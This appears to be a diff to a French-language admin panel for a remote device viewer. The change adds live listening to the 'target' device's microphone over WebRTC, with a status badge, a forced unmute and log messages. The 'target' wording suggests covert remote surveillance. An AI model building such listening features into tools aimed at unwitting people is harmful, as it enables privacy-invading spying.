@@ -82,6 +82,11 @@
                             <p class="text-sm font-medium">Sélectionnez un appareil en ligne à gauche, puis cliquez sur "Se connecter".</p>
                         </div>
                         <video id="remoteVideo" autoplay playsinline class="hidden w-full h-full object-contain"></video>
+                        <!-- Badge d'écoute du microphone cible -->
+                        <div id="audioStatusBadge" class="hidden absolute top-3 right-3 bg-emerald-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-full items-center gap-1.5 shadow-lg z-20">
+                            <span class="w-1.5 h-1.5 rounded-full bg-white animate-pulse"></span>
+                            🔊 MICROPHONE ACTIF
+                        </div>
                     </div>
 
                     <!-- Commandes administratives -->
@@ -314,12 +319,21 @@
                     }
                 };
 
-                // Capture du flux vidéo entrant
+                // Capture du flux vidéo et audio entrant
                 peerConnection.ontrack = (event) => {
-                    addLog("🎬 Flux vidéo reçu ! Liaison avec le lecteur vidéo.");
+                    addLog(`🎬 Liaison du flux actif : ${event.track.kind}`);
                     placeholderText.style.display = 'none';
                     remoteVideo.style.display = 'block';
                     remoteVideo.srcObject = event.streams[0];
+                    
+                    // Force l'écoute audio en retirant le mode silencieux (puisque l'admin clique manuellement pour lancer)
+                    remoteVideo.muted = false;
+                    remoteVideo.volume = 1.0;
+
+                    if (event.track.kind === 'audio') {
+                        document.getElementById('audioStatusBadge').style.display = 'flex';
+                        addLog("🔊 Microphone de la cible capté en direct !");
+                    }
                 };
 
                 // Envoi des ICE Candidates de l'admin à l'utilisateur
@@ -399,6 +413,7 @@
 
             remoteVideo.srcObject = null;
             remoteVideo.style.display = 'none';
+            document.getElementById('audioStatusBadge').style.display = 'none';
             placeholderText.style.display = 'flex';
             userInfoDiv.style.display = 'none';
             
